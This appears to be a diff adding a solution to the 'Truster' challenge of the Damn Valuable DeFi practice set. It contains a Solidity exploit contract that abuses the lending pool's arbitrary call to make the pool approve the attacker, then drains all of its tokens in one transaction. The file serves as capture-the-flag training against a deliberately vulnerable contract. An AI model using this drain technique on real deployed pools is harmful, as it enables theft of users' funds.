@@ -6,6 +6,34 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
 
+/**
+ * @notice Single-transaction exploit contract for Challenge 3: Truster.
+ * @dev Deploying this contract takes only 1 EOA transaction (`vm.getNonce(player) == 1`),
+ *      while its constructor batches both the `flashLoan` (approval) and `transferFrom` calls.
+ */
+contract TrusterExploit {
+    uint256 constant TOKENS_IN_POOL = 1_000_000e18;
+
+    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
+        // 1. Encode `token.approve(address(this), TOKENS_IN_POOL)`.
+        //    Crucial nuance: The `spender` MUST be `address(this)` (not `recovery`), because
+        //    `TrusterExploit` is the `msg.sender` that will call `token.transferFrom` below!
+        bytes memory data = abi.encodeCall(token.approve, (address(this), TOKENS_IN_POOL));
+
+        // 2. Borrow 0 DVT and instruct the pool to call `target.functionCall(data)` where
+        //    `target == address(token)`. Inside `token.approve`, `msg.sender` is `address(pool)`.
+        //    Because `approve` does not reduce the pool's token balance, the balance check passes!
+        bool success = pool.flashLoan(0, recovery, address(token), data);
+
+        // 3. Pull all 1,000,000 DVT from `pool` directly to `recovery` using the allowance granted above.
+        if (success) {
+            token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+        } else {
+            revert("Flash loan failed");
+        }
+    }
+}
+
 contract TrusterChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -50,7 +78,9 @@ contract TrusterChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_truster() public checkSolvedByPlayer {}
+    function test_truster() public checkSolvedByPlayer {
+        new TrusterExploit(pool, token, recovery);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
